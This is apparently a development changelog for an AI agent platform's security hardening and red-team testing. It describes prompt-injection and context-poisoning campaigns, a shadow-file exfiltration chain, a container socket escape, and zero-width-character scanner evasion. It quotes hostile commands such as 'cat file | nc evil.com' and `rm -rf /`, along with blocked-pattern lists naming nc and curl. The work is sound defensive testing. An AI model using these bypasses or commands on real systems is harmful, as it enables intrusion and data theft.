- **v2 red team pytest suite** — `tests/test_red_team_v2.py` with 60 tests validating all v2 scripts: campaign/category definitions, required fields, unique IDs, v2 additions present, original campaigns preserved, new functions (`_build_system_prompt`, AuditLogger, PlanValidator, RogueAttacker), B4Runner method coverage (17 async test methods), v1/v2 coexistence, shared library compatibility
- **B2 v2 AuditLogger bugfix** — `AuditLogger.__init__` type changed from `Path` to `Path | str` with `Path()` wrapping. String paths caused `AttributeError: 'str' object has no attribute 'parent'`

### Security
- **Sandbox isolation was silently inactive since implementation** — Podman's Docker-compat REST API silently ignores snake_case field names. The sandbox container create payload used snake_case throughout (`host_config`, `binds`, `cap_drop`, etc.), meaning every security setting was ignored: no ReadonlyRootfs, no CapDrop, no NoNewPrivileges, no NetworkDisabled, no volume mounts, no resource limits. Containers ran with full capabilities and network access. The only isolation was process namespace separation. Red team (B2) did not catch this because all 34 blocks occurred at scanner/policy layers (L1-9) before reaching the sandbox — the sandbox was never actually tested under attack. See `docs/design/2026-02-28_sandbox-isolation-gap-analysis.md` for full analysis and proposed B4 sandbox isolation test suite

### Fixed
- **Sandbox API field casing (Fix V)** — all field names in the Podman container create body changed from snake_case to Docker API PascalCase (`HostConfig`, `ReadonlyRootfs`, `CapDrop`, `Binds`, `Cmd`, `Image`, `Name`, etc.). Podman proxy updated to accept both casings for `Name`/`Image` validation. Root cause of sandbox isolation gap above AND all file-not-found errors in runs 5-6
- **Sandbox volume mismatch** — sandbox containers mounted `sentinel-workspace` (unprefixed) instead of `sentinel_sentinel-workspace` (compose-prefixed). `file_write` wrote to the correct volume inside the sentinel container; `shell_exec` ran in a sandbox container against an empty volume. Root cause of all file-not-found errors in run 5 (~31 failures across all suites). Fix: added `SENTINEL_SANDBOX_WORKSPACE_VOLUME=sentinel_sentinel-workspace` to compose env
- **Planner empty/invalid JSON responses** — Claude (Sonnet 4.6) returning empty responses on follow-up planning turns. Average response time 5.4s for failures vs 93.7s for successes — consistent with API-side issue under load. Fix: (1) reverted model to `claude-sonnet-4-5-20250929`; (2) added 3-attempt retry loop covering empty responses, invalid JSON (non-refusal), and HTTP 529 (overloaded). Refusals are never retried
- **Sandbox log stream demux** — Podman container logs API returns multiplexed stream frames (8-byte header per frame). Code read raw bytes as text via `resp.text`, corrupting stdout/stderr with binary framing characters. Fix: added `_demux_stream()` in `sandbox.py` using `struct.unpack` to strip frame headers, switched to `resp.content` (bytes)
- **G-suite excessive container restarts** — `run_functional_tests.sh` was designed for standalone use, managing its own compose settings and restarting containers on entry and exit. When called in a loop by `run_validation.sh` (5 suites), this caused 10 unnecessary container restarts (2 per suite). Fix: `run_validation.sh` now owns the compose lifecycle — saves settings once, sets test mode, restarts once, runs all suites with `--managed` flag, restores once on exit. `run_functional_tests.sh` accepts `--managed` to skip compose modification, container restarts, and EXIT trap. Standalone use (without `--managed`) works exactly as before. Also fixed hardcoded restore values in standalone mode to save/restore actual values (matching `run_red_team.sh` pattern) instead of hardcoding `full`/`false`/`false`
- **Pipeline settle gap** — added 30-second settle between validation and red team phases in `run_pipeline.sh`
- **Podman proxy keep-alive hang** — raw byte-relay proxy hung on upstream HTTP/1.1 keep-alive responses. Fix: inject `Connection: close` header before forwarding

### Changed
- **Reverted to Sonnet 4.5** — `claude_model` from `claude-sonnet-4-6` back to `claude-sonnet-4-5-20250929`. Sonnet 4.6 exhibited API instability (empty responses, incomplete JSON) under load. Will revisit once demand settles

---

## 2026-02-27

### Added
- **Podman socket API proxy** — `sentinel/tools/podman_proxy.py` restricts container Podman socket access to sandbox operations only. Async Unix socket proxy with path allowlist, container ID tracking, and create body validation. Blocks all `libpod/` paths, `exec` into other containers, volume/network enumeration. Started from entrypoint.sh before uvicorn. 28 new tests
- **Shadow file content scanner** — `CredentialScanner._check_shadow_content()` detects `/etc/shadow` content by its 9-field colon-separated format. Two-tier: 2+ matching lines always flagged, single line flagged only for known system accounts (root, daemon, sshd, etc.). Defence-in-depth for B2 chained_exfil. 8 new tests

### Changed
- **Podman socket mount renamed** — host socket now mounts to `/run/podman/podman-host.sock` (was `/run/podman/podman.sock`). Sandbox connects via proxy at `/tmp/podman-proxy.sock`. Direct socket no longer accessible from application code
- **Non-zero exit codes now fail steps** — `_execute_in_sandbox()` sets `_last_exec_meta` (was missing, unlike direct shell path). Orchestrator checks exit code after tool execution; non-zero returns `status="failed"` and halts the plan. New `FAILED` enum value in `StepStatus`. **Risk:** commands like `grep` returning exit code 1 (no match) will now fail steps — this is intentional secure-by-default posture but may cause G-suite regression. Planner should handle retries
- **Workspace cleanup between red team scenarios** — `run_red_team.sh` now calls `cleanup_workspace()` (clears `/workspace/*`) before each scenario. Prevents cross-contamination from previous test artifacts (B2 chained_exfil left `/workspace/etc/shadow` behind)

### Fixed
- **B3 Phase 2 ollama route false positive** — route check in `red_team_b3.sh` grepped for `0.0.0.0` in hex `/proc/net/route` output. Gateway `00000000` means "directly connected" on the internal-only network, not a default route. Fix: when parsing `/proc/net/route`, require both Destination=`00000000` AND Gateway!=`00000000` (non-zero gateway = actual external routing). `ip route` path uses `^default ` prefix match

### Security
- **Podman socket exposure closed** — B3 Phase 2 proved the real Podman socket let code inside the sentinel container list all host containers and exec into sentinel-ollama. The new proxy allowlists only sandbox operations (create/start/wait/kill/logs/inspect/delete for `sentinel-sandbox-*` containers with the configured image). All other API calls return 403 Forbidden
- **B2 chained_exfil blocked** — three compounding bugs let a malicious plan read `/etc/shadow` content: (1) non-zero exit codes not surfaced as step failures, (2) no scanner for shadow file content format, (3) workspace volume persisting between runs. All three now fixed

### Changed
- **`bash` and `sh` added to allowed commands** — policy engine now permits direct `bash`/`sh` invocation. The dangerous patterns (`bash -c`, `| bash`, `sh -c`, `| sh`) remain blocked by `blocked_patterns`. Addresses debug_b2 false positive where `bash` itself was blocked on turn 1
- **Medium plan thresholds widened** — `expected_steps_max` from 4 to 6 for m1, m3, m4, m5 in `functional_test_plans.py`. Claude consistently produces 5-7 steps for medium complexity; the old threshold (2-4) was too narrow
- **Ollama context window bumped** — `OLLAMA_NUM_CTX` from 16384 to 20480 in `podman-compose.yaml`. Gives Qwen 3 14B more context for complex multi-step tasks. Conservative increase to stay within RTX 3060 12GB VRAM budget (weights ~8.9GB + KV cache). Needs VRAM verification after rebuild

- **Pipeline runner** — `scripts/run_pipeline.sh` chains validation (rebuild + G-suite) and red team (B1, B1.5, B2, B3) into a single unattended pipeline. Signal messages at every phase transition. G-suite failures don't abort red team. Flags: `--skip-rebuild`, `--skip-gsuite`, `--skip-redteam`, `--no-signal`, `--dry-run`
- **Signal notifications for red team** — `run_red_team.sh` now sends Signal messages at each scenario start/complete, matching `run_validation.sh` pattern. `--no-signal` flag to suppress

### Changed
- **Script split: overnight → validation + red team** — `run_overnight.sh` replaced by two independent scripts: `run_validation.sh` (rebuild + G-suite functional tests + Signal notifications) and `run_red_team.sh` (self-contained security testing). They can run independently, together, or via `run_pipeline.sh`
- **Red team B2 auto-toggle** — `run_red_team.sh` now automatically enables/disables `SENTINEL_RED_TEAM_MODE` in compose and restarts containers for B2 testing. No manual compose editing needed. EXIT trap cleans up on crash

### Fixed
- **B2 red team endpoint HTTP 405** — static file catch-all mount at `/` (registered at module level) shadowed the red team route at `/api/test/execute-plan` (registered during lifespan). Routes added during lifespan are appended after the catch-all, so `StaticFiles` intercepted POST requests and returned 405 (only supports GET/HEAD). Fix: moved static mount into lifespan so it's always the last route registered. Verified with partial B2 run (34/40 submissions, 33 blocked, 1 safe pass, 0 exploits, 0 errors)
- **Red team scripts use venv Python** — `run_red_team.sh` called bare `python3` (system Python) for B1/B1.5/B2/analysis scripts, but `anthropic` module is only in `.venv`. Added `$PYTHON` variable pointing to `.venv/bin/python3`. Fixes `ModuleNotFoundError: No module named 'anthropic'` that blocked run 5 red team phase
- **Code fence extraction with embedded doc fences** — Qwen generates Rust doc comments with `/// ````, causing `extract_code_blocks()` to find multiple blocks and fall through. Fix: outer-wrapping fence detection in `executor.py` peels the outer fence regardless of inner content. Fixes t1_rust_binary_search, t3_multistage_rust
- **Planner over-planning execution steps** — Sonnet 4.6 + "plan from scratch" prompt caused planner to add `bash`/`sh` execution steps (which are in the blocked command list). Added prompt rule: "Do NOT plan steps to execute, run, or test generated code/scripts". Fixes t1_bash_setup, t2_makefile_c_project
- **Planner under-decomposing multi-file tasks** — Planner collapsed multi-file tasks into single steps, producing mixed output that triggers scanners. Added prompt rule: "When a request involves multiple distinct files, use separate steps per file". Fixes t3_multistage_rust
- **PlanStep.description field optional** — Changed from required `str` to `str = ""` in models.py. Sonnet 4.6 occasionally omits this field, causing plan validation failure
- **Red team --foreground flag** — `run_red_team.sh` now accepts `--foreground` as a no-op flag (overnight runner was passing it, causing arg parse failure and preventing red team from running)

---

## 2026-02-26

### Changed
- **Sonnet 4.6 model upgrade** — `claude_model` from `claude-sonnet-4-5-20250929` to `claude-sonnet-4-6`, `claude_max_tokens` from 4096 to 8192. Addresses c5 JSON truncation (plan output exceeded 4096 tokens at 15,192 chars)
- **Session history reframing** — planner injection block changed from "CONVERSATION HISTORY" (conversational framing) to "OPERATIONAL LOG" (operational log framing). Adds explicit "always plan from scratch" instruction and "prior successes do NOT mean skip" rule. Addresses c2 where Claude refused a legitimate task because session history showed it "already completed". Adversarial escalation detection preserved
- **Tiered history formatting** — successful turns now emit one-liner headers only (no step-by-step detail), failed/blocked turns retain full F1 enriched detail. Cuts token usage for sessions with many successes while preserving debugging runway for failures
- **Test session isolation** — functional test scripts (plans, build, e2e, smoke) now include run timestamp in source keys (`functional_plans_{index}_{timestamp}`). Prevents session bleed between test runs (was causing c3 cascade-blocking across runs 2-3). Debug and deps scripts already had timestamps

### Added
- **Overnight runner script** — `scripts/run_overnight.sh` runs full G-suite + red team (including B2) unattended. Sequence: container rebuild → G1-G5 at TL4 → enable RED_TEAM_MODE → full red team → disable RED_TEAM_MODE → summary. Optional Signal progress notifications. Flags: `--skip-rebuild`, `--skip-gsuite`, `--skip-redteam`, `--skip-b2`, `--no-signal`, `--dry-run`

### Fixed
- **`.env` scanner false positives** — two new heuristics: (1) `_is_in_ignore_listing()` in strict input scanner (`scan()`) exempts `.env` when it appears in a comma-separated file-pattern list (≥3 pattern-like items, e.g. gitignore/containerignore listings in prose). (2) `_surrounding_is_ignore_listing()` in output scanner (`scan_output_text()`) exempts `.env` standalone lines when surrounding ±5 lines form an ignore-file listing (≥80% match, XML wrapper tags excluded). Fixes t1_gitignore and c3_full_stack step 11. 4 new tests
- **Red team script crashes** — `_query()` in red_team_lib.py only caught `anthropic.APIError`, other exceptions (network errors, JSON decode) silently crashed the campaign. Broadened to `Exception`. Added top-level try/except handlers to B1, B1.5, B2 scripts. Added `PYTHONUNBUFFERED=1` to runner to prevent buffered output loss on crash
- **RESPONSE tag stripping order-of-operations** — `<RESPONSE>` tags were stripped AFTER `extract_code_blocks()` but the EXECUTION destination fence unwrap then overwrote the clean content with the pre-strip code block. When Qwen outputs `<RESPONSE>code</RESPONSE>` without markdown fences, the B-006 fallback puts the full text (tags included) into a single CodeBlock. The EXECUTION unwrap at line 1236 then replaced the stripped content with the tagged version. Fix: moved `<think>` + `<RESPONSE>` stripping to before code block extraction so all downstream operations work on clean content. Defence-in-depth: added `<RESPONSE>` tag strip in `_file_write()` for code files. Regression test added. Affected ~6-8 G-suite tests (t2_fastapi_app, t2_makefile_c_project, t1_rust_binary_search, s6_debug_buggy, multiple G2 debug scenarios)

---

## 2026-02-25

### Added
- **Telegram channel (A3b)** — long-polling bot via python-telegram-bot. Chat allowlist, per-chat rate limiting, message splitting for Telegram's 4096-char limit. Wired into app.py startup/shutdown/health. 12 unit tests
- **Radicale CalDAV server** — lightweight Python CalDAV server running inside the sentinel container (localhost:5232). bcrypt htpasswd auth from Podman secret, file-based storage at `/data/radicale/collections`. Config at `container/radicale.conf`, started by `container/entrypoint.sh`
- **Container entrypoint** — `entrypoint.sh` replaces direct uvicorn CMD. Creates Radicale dirs, generates htpasswd from secret, starts Radicale in background, exec's uvicorn as main process
- **Brave web search config** — env vars and secret mount for Brave API key (`/run/secrets/brave_api_key`)
- **Email config (IMAP/SMTP)** — Brevo SMTP (send) + Disroot IMAP (receive) env vars and secret mounts. Placeholder credentials until accounts verified
- **5 new Podman secrets** — `brave_api_key`, `telegram_bot_token`, `smtp_password`, `imap_password`, `caldav_password`

### Changed
- **Compose resource bump** — sentinel container: 4G→8G mem, 1G→2G reservation, 4→6 CPUs, 100M→512M tmpfs
- **Sandbox enabled** — `SENTINEL_SANDBOX_ENABLED=true` in compose
- **Signal enabled** — `SENTINEL_SIGNAL_ENABLED=true`, account `+440000000000`, allowed senders configured. Verified: full round-trip message received and replied
- **Telegram enabled** — `SENTINEL_TELEGRAM_ENABLED=true`, bot token from BotFather, chat ID locked to owner. Verified: full round-trip message received and replied
- **tmpfs noexec removed** — GraalVM native signal-cli binary extracts `libsignal_jni` to `/tmp` at runtime and needs exec permission. Sandbox containers have their own isolated filesystems so this doesn't weaken the security model
- **signal-cli dependency** — pyproject.toml adds `caldav>=1.3,<2.0`, `radicale>=3.2,<4.0`, `python-telegram-bot>=21.0,<22.0`

### Security
- **R14: Zero-width character stripping** — `normalise_homoglyphs()` now strips Unicode Cf-category characters (U+200B ZWSP, U+200C ZWNJ, U+200D ZWJ, U+FEFF BOM, U+00AD soft hyphen, U+2060 word joiner, U+180E MVS). Wired into `CredentialScanner.scan()` and `CommandPatternScanner.scan_output_text()` — closes regex-evasion bypass where `r\u200Bm -rf /` evaded `dangerous_rm` pattern. 22 new tests

### Known Issues
- **Channel response formatting** — Signal and Telegram receive raw JSON pipeline output (plan summary, step result, task completion as 3 separate messages) instead of human-readable text. Needs orchestrator-to-channel formatting layer
- **Security scanner names leaked to channels** — blocked responses expose internal scanner names (e.g. "Prompt Guard") to end users. Channel responses should sanitise error details

### Fixed
- **Fence unwrap relaxed for prose-wrapped code** — orchestrator fence unwrap no longer requires `content.startswith("```")`. Qwen often outputs prose before a code block; the old check failed and fences leaked into files. Now extracts the code if there's exactly 1 code block, regardless of surrounding prose
- **Defence-in-depth fence strip at file_write** — `_file_write()` now strips markdown fences from code file types (`.py`, `.rs`, `.js`, etc.) as a second layer. If orchestrator unwrap missed a case (e.g. DISPLAY destination), fences are caught before hitting disk. Non-code files (`.md`, `.txt`, `.json`) are untouched
- **Word-boundary blocked pattern matching** — single-word blocked patterns (`nc`, `exec`, `eval`, `mount`, `curl`) now use `\b` word-boundary regex instead of substring matching. Prevents false positives like `advanced.py` (nc), `execute` (exec), `evaluate` (eval), `amount` (mount). Multi-word patterns (`rm -rf`, `python3 -c`, `| sh`) keep substring matching
- **Compound command validation** — `check_command()` now splits on `|`, `&&`, `||`, `;` (outside quotes) and validates each sub-command against the allowed list and path constraints. Previously only the first command was checked, so `cat file | nc evil.com` passed because base=`cat`. 17 new tests
- **G-suite + red team script hardening** — 9 bugs found and fixed across test harness scripts: `analyse_red_team.py` JSONL format mismatch (rewritten loader + normalisation layer), `run_red_team.sh` set-e/pipefail issues, `red_team_b2.py` missing health check + wrong defaults + no fsync, `functional_test_debug.py` + `functional_test_deps.py` NoneType crash on `{"error": null}`
- **Build-file `dangerous_rm` exemption** — `CommandPatternScanner` now recognises Makefile content (by language tag or content heuristic) and exempts `rm -f $(VAR)` targeting shell variables in clean targets. Absolute and home-dir paths remain flagged. Follows existing Dockerfile exemption pattern. 10 new tests
- **G suite runner bash bug** — `run_g_suite_all.sh` died after first suite due to `((PASS++))` evaluating `((0))` → exit code 1 under `set -e`. Fixed arithmetic to `PASS=$((PASS + 1))`
- **G1 `t1_json_config` verification too strict** — accepted only exact keys `host`/`database`, now accepts any key containing "host"/"port" (e.g. `database_host`, `database_port`)

- **Defensive RESPONSE tag stripping** — Qwen sometimes wraps output in `<RESPONSE>` tags even when not instructed to. Stripping now runs unconditionally on all worker output regardless of `output_format`, preventing tag leakage into file writes and UI display
- **Auto-tag intermediate LLM steps** — orchestrator now enforces `output_format="tagged"` on any `llm_task` step whose `output_var` feeds a downstream `tool_call`. Previously relied on planner to set this correctly
- **TL4 constraint auto-inference** — instead of rejecting plans missing `allowed_commands`/`allowed_paths` at TL4, constraints are now auto-derived from step args (file path → `allowed_paths`, command → `allowed_commands`). Falls back to legacy scanning for `$var` references. 3 new tests
- **Provenance content persistence** — post-processing (tag stripping, emoji removal, fence closure) now persists to SQLite via `update_content()`. Previously, cleaned content only existed on the in-memory Python object; the DB row retained raw Qwen output, so downstream execution variable resolution got unstripped `<RESPONSE>` tags. 10 new tests (in-memory + SQLite)
- **Markdown fence unwrapping for execution** — single code blocks destined for tool_call consumption (EXECUTION destination) are automatically unwrapped from markdown fences. Qwen wraps code in ` ```python...``` ` even for execution-destined output; file_write then wrote the fenced markdown as-is, causing SyntaxError

### Changed
- **Container: added `make` and `rustc`** — worker container now includes build tools for Makefile compilation and Rust verification in G1 functional tests (~185MB, 5% image growth)
- **G7 smoke test: 5/5 PASS at TL4** — all 5 cross-suite prompts (build, debug, e2e, plans, deps) pass after the provenance persistence + fence unwrapping fixes. Step 4 of TL4 activation sequence complete
- **G1 first run: 7/13 (53.8%)** — Tier 3 perfect (3/3), Tiers 1-2 had 4 failures (2 scanner FPs, 1 strict verification, 1 missing rustc) + 2 Qwen quality issues. Fixes applied, re-run in progress

---

## 2026-02-24

### Added
- **G7: Daily Smoke test suite** — 5 cross-suite prompts (G1-G5) for fast regression detection. Multi-turn debug support, plan quality gate, response verification. ~10 min runtime. 43 unit tests. All G-phase scripts (G1-G7) now complete
- **TL4 activation sequence** — 8-step runbook in capability tracker for benchmark → config fix → G-suite → red team → TL4 production. Deployment changelog records run order rationale

### Security
- **TL4 benchmark v0.4.1-alpha-tl4 (in progress)** — 932/1136 prompts (82%). 0 confirmed real risks. 1 triage false positive (mocked test string matching `rm -rf /` regex). 5 needs_review all safe on inspection (educational content with refusal). 84% genuine pass rate, 96.4% fixable after PolicyEngine tuning (`cd` allowlist = 12 FPs)
- **Red team B1/B1.5 indirect injection coverage confirmed** — B1.5 tests injection via search results, Signal messages, email bodies/attachments, webhook payloads. B1 tests context poisoning over 10-15 turn sessions. B2 tests metadata side-channel oracles. Custom benchmark compared favourably against industry standards (AgentHarm, AgentDojo, InjecAgent, ASB)

---

## 2026-02-23

### Fixed
- **A1: WASM sidecar namespace fix** — `env` → `sentinel` namespace, Python fallback on sidecar error, `shell_exec` alias. Sidecar now functional E2E (was broken since Feb 16, all tests used mocks). 4 new tests
- **D5: Constraint examples + base-command support** — planner prompt examples fixed (base command names not full strings), validator short-circuits bare constraints like `["find"]`. Fixes 8/20 D5 mini benchmark failures. 13 new tests
- **ASCII gate regression** — skip gate when `skip_input_scan=True` (chained steps). Eliminates 30 FPs (62% multi-step FP rate → ~0%). 2 new tests
- **R10: Dockerfile scanner hardened** — content-based detection for untagged/unfenced Containerfile output. 6 new tests
- **Benchmark triage hardening** — empty danger_signals early return, refusal-before-destination reorder

### Changed
- **Documentation cleanup** — archived historical content, trimmed context-loaded files from ~2,080 → ~430 lines (79% reduction). Archives in `docs/archive/` and `docs/design/archive/`

### Added
- **TL4 autonomy readiness** — PolicyEngine injection patterns now trust-level-aware: `$(` and backtick blocked at all levels, `&&`/`||`/`;`/`|` relaxed at TL4. YAML policy expanded with ~30 allowed commands, 9 path-constrained, 6 removed from blocked_patterns. Worker library cache (22 Python libs) in pyproject.toml + Containerfile. Monthly rebuild script with CVE gate. 58 new tests
- **TL4 corrective measures** — 5 features, 22 tests: planner prompt restructure (XML sections), worker prompt restructure, mandatory constraints at TL4, constraint-gated provenance bypass, D5 mini benchmark supplement (+20 prompts)
- **G1-G5 functional test suites** — scripts implemented (runs pending TL3/TL4 active):
  - G1: Build capability (13 prompts, 3 tiers) + shared wrapper + analysis script
  - G2: Debugging & error recovery (10 prompts, multi-turn fix cycles)
  - G3: E2E autonomous workflows (8 graduated scenarios, TL4 gate)
  - G4: Plan quality & decomposition (15 prompts, structural analysis)
  - G5: Environment & dependency management (6 prompts, fallback detection)
- **G6: Security Tax test suite** — dual-config (defended vs baseline) utility measurement:
  - 50 prompts across 5 categories (prose, code_gen, tool_use, multi_step, borderline)
  - `SENTINEL_BASELINE_MODE` env var bypasses scanning layers (input/output scan, Prompt Guard, script gate, spotlighting) while keeping provenance + constraint validation
  - Analysis script: `compute_security_tax_metrics()` + `generate_security_tax_report()` with per-category breakdown, scanner FP contribution, ≤10pp pass/fail target

### Security
- **TL4 partial benchmark triage** — 0 confirmed real risks (802/1136 prompts). Quality 93.4% good

---

## Recent History (Summary)

> Full detail in `archive/2026-02-23_changelog-v0.2-to-v0.3.md`

| Date | Key Changes |
|------|-------------|
| 2026-02-22 | D5 plan-policy enforcement, F1-F4 multi-turn context ALL COMPLETE, destination-aware scanning, Signal native daemon + registration, UI Palette H theme, IMAP/CalDAV backends (79 tests), worker/planner prompt research |
| 2026-02-21 | F1/F2 research + implementation, D4 TL3 file writes, E5 sandboxed shell, R7-R13 scanner improvements, A2A protocol, bug hunt COMPLETE (99 findings, 242 new tests), D3 TL2 red team PASS (grade 0.87) |
| 2026-02-20 | D2/D3 trust level code, TL1 activated, benchmark tooling fixes, metrics dashboard, token counting, cost analysis |
| 2026-02-19 | D1 TL0 red team PASS (grade 0.85), CodeShield→Semgrep replacement, script gate, code extractor |
| 2026-02-17 | v0.2 initial hardening: code block extraction, credential patterns, emoji stripping, override detection (84 new tests) |
